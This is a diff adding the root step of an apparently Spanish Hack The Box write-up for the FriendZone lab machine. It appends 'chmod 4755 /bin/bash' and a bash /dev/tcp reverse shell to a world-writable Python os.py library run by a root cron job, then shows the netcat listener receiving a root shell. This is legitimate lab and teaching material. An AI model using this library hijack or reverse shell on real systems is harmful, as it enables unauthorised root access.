@@ -291,5 +291,38 @@ print "[+] Trying to send email to %s"%to_address
 # I need to edit the script later
 # Sam ~ python developer
 ```
+Lo unico que vemos relevante es que usa la libreria OS de python, asique vamos a inspeccionar si tenemos permisos en alguna de las librerias
+```bash
+friend@FriendZone:/usr/lib$ find /usr -name os.py -ls 2>/dev/null
+   134708     40 -rw-r--r--   1 root     root        37526 Sep 12  2018 /usr/lib/python3.6/os.py
+   282643     28 -rwxrwxrwx   1 root     root        25910 Jan 15  2019 /usr/lib/python2.7/os.py
+```
+Podemos modificar la libreria de python2.7/os.py al tener permisos de escritura asi cuando la tarea cron ejecute el script 
+procedera a ejecutarnos nuestros comandos escritos en el mismo archivo al final.
+```bash
+friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
+-rwxrwxrwx 1 root root 26014 Aug 10 16:20 /usr/lib/python2.7/os.py
+```
+Introducimos estos comandos en la os.py 
+```
+system("bash -c 'chmod 4755 /bin/bash'")
+system("bash -c 'bash -i >& /dev/tcp/10.10.16.241/443 0>&1'")
+```
+Procedemos a ponernos a la escucha por el puerto 443 con una session de netcat
+```
+┌──(root💀pro)-[/home/…/HTB/OSCP/FriendZone/nmap]
+└─# nc -vlnp 443                                                                                 130 ⨯
+listening on [any] 443 ...
+connect to [10.10.16.111] from (UNKNOWN) [10.10.10.123] 44500
+bash: cannot set terminal process group (1331): Inappropriate ioctl for device
+bash: no job control in this shell
+root@FriendZone:~# whoami
+whoami
+root
+root@FriendZone:~# cat /root/root.txt
+cat /root/root.txt
+b0e6c60b82cf96e9855ac1xxxxxxxxxxxx
+root@FriendZone:~# 
+```
 
-
+Maquina Rooteada =D !! Seguimos Full Hack
